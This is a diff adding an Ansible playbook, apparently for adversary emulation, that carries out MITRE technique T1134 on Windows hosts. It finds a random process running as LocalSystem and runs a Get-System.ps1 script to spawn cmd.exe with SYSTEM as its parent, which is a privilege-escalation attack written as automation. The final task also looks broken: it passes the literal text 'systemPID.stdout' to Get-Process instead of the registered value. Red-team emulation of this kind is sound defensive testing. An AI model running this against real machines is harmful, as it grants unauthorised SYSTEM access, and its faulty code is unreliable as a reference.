@@ -1,0 +1,15 @@
+# attack_technique: T1134
+# Reference: https://github.com/decoder-it/psgetsystem
+- name: T1134 - Access Token Manipulation
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+    - name: Get running random PID running as system
+      win_shell: |
+        Get-WMIObject -Query "Select ProcessId From Win32_Service WHERE state='Running' and StartName='LocalSystem'" | findstr ProcessId | %{$_.split(':')[1]} | Sort-Object -Unique | Get-Random
+      register: systemPID   
+      
+    - name: Execute elevation powershell script
+      win_shell: |
+        c:\temp\Get-System.ps1; [MyProcess]::CreateProcessFromParent((Get-Process systemPID.stdout).Id,"cmd.exe")
